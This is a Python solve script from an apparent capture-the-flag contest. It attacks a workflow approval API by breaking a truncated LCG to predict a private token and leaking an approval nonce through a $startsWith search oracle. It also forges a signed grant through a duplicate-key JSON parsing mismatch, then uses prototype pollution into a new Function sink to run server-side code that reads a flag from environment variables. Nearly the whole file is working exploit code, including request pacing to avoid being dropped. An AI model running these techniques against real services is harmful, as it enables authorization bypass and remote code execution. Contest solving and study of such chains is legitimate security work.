#!/usr/bin/env python3
"""
fluxion chain against the FIRST handout, kept for the record. The deployed
build hardened saveViewPreferences, so stages 4 and 5 here are dead live.
Use solve2.py.
"""

import base64
import json
import os
import re
import sys
import http.client as http_client
import time
import urllib.error
import urllib.parse
import urllib.request

# ---------------------------------------------------------------- target ----

LOCAL_URL = os.environ.get("CTF_LOCAL_URL", "http://127.0.0.1:13000")
RECORDED = os.environ.get("CTF_RECORDED_URL", "")


def _from_meta():
    here = os.path.dirname(os.path.abspath(__file__))
    try:
        with open(os.path.join(here, os.pardir, "meta.json")) as fh:
            conn = (json.load(fh).get("connection") or "").strip()
    except OSError:
        return ""
    return _normalise(conn)


def _normalise(s):
    s = (s or "").strip()
    if not s:
        return ""
    if s.startswith("http://") or s.startswith("https://"):
        return s.rstrip("/")
    m = re.match(r"^(?:nc\s+)?([\w.-]+)[\s:]+(\d+)$", s)
    if m:
        return "http://%s:%s" % (m.group(1), m.group(2))
    return "http://" + s.rstrip("/")


def base_url():
    if os.environ.get("CTF_LOCAL") == "1":
        return LOCAL_URL
    t = _normalise(os.environ.get("CTF_TARGET", ""))
    if t:
        return t
    t = _normalise(RECORDED) or _from_meta()
    if t:
        return t
    sys.exit("no target: set CTF_LOCAL=1, CTF_TARGET, or record a connection "
             "string in meta.json")


BASE = base_url()


_PARTS = urllib.parse.urlsplit(BASE)
_HOST = _PARTS.hostname
_PORT = _PARTS.port or (443 if _PARTS.scheme == "https" else 80)
_TLS = _PARTS.scheme == "https"
_PACE = float(os.environ.get("CTF_PACE", "0.12"))
_conn = None


def _connect():
    global _conn
    if _conn is not None:
        try:
            _conn.close()
        except Exception:
            pass
    cls = http_client.HTTPSConnection if _TLS else http_client.HTTPConnection
    _conn = cls(_HOST, _PORT, timeout=30)
    return _conn


def http(path, data=None, tries=6):
    """One keep-alive connection, paced and retried.

    The contest edge drops a client that opens a fresh socket per request, and
    the approvalNonce oracle needs about 140 of them.
    """
    body = None
    if data is not None:
        body = json.dumps(data).encode() if not isinstance(data, bytes) else data
    hdrs = {"content-type": "application/json", "connection": "keep-alive",
            "accept": "application/json", "host": _PARTS.netloc}
    last = None
    for attempt in range(tries):
        c = _conn or _connect()
        try:
            c.request("POST" if body is not None else "GET", path, body, hdrs)
            resp = c.getresponse()
            raw = resp.read()
            time.sleep(_PACE)
            return json.loads(raw.decode() or "{}")
        except Exception as e:                       # noqa: BLE001
            last = e
            _connect()
            time.sleep(min(2 ** attempt * 0.5, 8))
    raise RuntimeError("request to %s failed after %d tries: %r" % (path, tries, last))


def rpc(method, params=None):
    # /api/rpc takes a RAW body and JSON.parse()s it itself, which is exactly
    # what lets __proto__ survive as an own key.
    raw = json.dumps({"method": method, "params": params or {}}).encode()
    return http("/api/rpc", raw)


# ------------------------------------------------- 1. truncated LCG break ----

LCG_A = 6364136223846793005
LCG_C = 1442695040888963407
MOD = 1 << 64
SHIFT = 40                 # step ids publish bits 63..40, so 40 bits are hidden
LOW = 1 << SHIFT


def b64u_int(s):
    return int.from_bytes(base64.urlsafe_b64decode(s + "=" * (-len(s) % 4)), "big")


def b64u_state(s):
    return base64.urlsafe_b64encode(s.to_bytes(8, "big")).decode().rstrip("=")


def recover_states(highs):
    """highs: top-24-bit outputs of consecutive LCG states. -> full states."""
    from fpylll import CVP, LLL, IntegerMatrix

    n = len(highs)
    # low_i = coefA_i * x + coefB_i (mod 2^64), where x = low_0 in [0, 2^40)
    coef_a, coef_b = [1], [0]
    for i in range(n - 1):
        k = (LCG_A * highs[i] * LOW + LCG_C - highs[i + 1] * LOW) % MOD
        coef_a.append(LCG_A * coef_a[-1] % MOD)
        coef_b.append((LCG_A * coef_b[-1] + k) % MOD)

    m = n - 1
    basis = IntegerMatrix(m + 1, m + 1)
    for j in range(m):
        basis[0, j] = coef_a[j + 1]
        basis[j + 1, j] = MOD
    basis[0, m] = 1
    LLL.reduction(basis)
    target = [(LOW // 2 - coef_b[j + 1]) % MOD for j in range(m)] + [LOW // 2]
    v = CVP.closest_vector(basis, tuple(target))
    x = v[m] % MOD

    states = [(highs[j] * LOW + (coef_a[j] * x + coef_b[j]) % MOD) for j in range(n)]
    for j in range(n - 1):
        if (LCG_A * states[j] + LCG_C) % MOD != states[j + 1]:
            return None
    return states


def private_hook_token(run_id):
    ev = rpc("fetchEvents", {"runId": run_id})["result"]["events"]
    highs = [b64u_int(e["stepId"]) for e in ev]
    if len(highs) < 4:
        sys.exit("not enough step ids to break the LCG")
    states = recover_states(highs)
    if states is None:
        sys.exit("LCG recovery failed to satisfy the recurrence")
    # world.js: five step ids via next(), then the hook token via nextToken().
    return b64u_state((LCG_A * states[-1] + LCG_C) % MOD)


# -------------------------------------------- 2. approvalNonce via oracle ----

HEX = "0123456789abcdef"


def leak_nonce(run_id, length=16):
    """searchRuns restricts approvalNonce to $startsWith, which is a full oracle."""
    prefix = ""
    for _ in range(length):
        for c in HEX:
            f = {"runId": run_id, "approvalNonce": {"$startsWith": prefix + c}}
            r = rpc("searchRuns", {"filter": f})["result"]
            if r["count"] >= 1:
                prefix += c
                break
        else:
            sys.exit("nonce oracle stalled at %r" % prefix)
    return prefix


# ------------------------------------------------ 3. grant signing oracle ----

def forge_grant(run_id, nonce):
    """Regex sees the first "act", JSON.parse keeps the last. Sign act=resume."""
    doc = ('{"act":"preview","aud":"approvals","runId":"%s","nonce":"%s",'
           '"act":"resume"}' % (run_id, nonce))
    r = rpc("previewApprovalGrant", {"document": doc})["result"]
    if "grant" not in r:
        sys.exit("signing oracle refused: %r" % r)
    return r["grant"]


# --------------------------------------------------------------- driver -----

def main():
    print("[*] target %s" % BASE)

    runs = http("/api/workflows/runs")["runs"]
    admin = [r for r in runs if r["workflowName"] == "admin-provision-approval"]
    if not admin:
        sys.exit("no admin-provision-approval run")
    run_id = admin[0]["runId"]
    print("[*] privileged run %s (%s)" % (run_id, admin[0]["status"]))

    token = private_hook_token(run_id)
    print("[+] private hook token recovered from truncated LCG: %s" % token)

    nonce = leak_nonce(run_id)
    print("[+] approvalNonce leaked via $startsWith oracle: %s" % nonce)

    grant = forge_grant(run_id, nonce)
    print("[+] act=resume grant signed by the preview oracle")

    r = rpc("resumeHook", {"token": token, "grant": grant,
                           "payload": {"approved": True}})["result"]
    print("[*] resumeHook -> %s" % json.dumps(r))
    if r.get("status") != "completed":
        sys.exit("run did not complete")

    # 4. pollute Object.prototype.report through the unguarded mergeDeep.
    pol = {"prefs": {"__proto__": {"report": {
        "template": "return String(run._flag || process.env.FLAG)",
        "key": nonce,
    }}}}
    rpc("saveViewPreferences", pol)
    print("[+] Object.prototype.report polluted")

    # 5. new Function sink.
    out = rpc("renderRunReport", {"runId": run_id})["result"]
    report = str(out.get("report", ""))
    print("[*] renderRunReport -> %s" % report)

    m = re.search(r"TFC(?:CTF)?\{[^}]*\}", report)
    if not m:
        sys.exit("no flag in report")
    print("\nFLAG: %s" % m.group(0))
    return m.group(0)


if __name__ == "__main__":
    main()
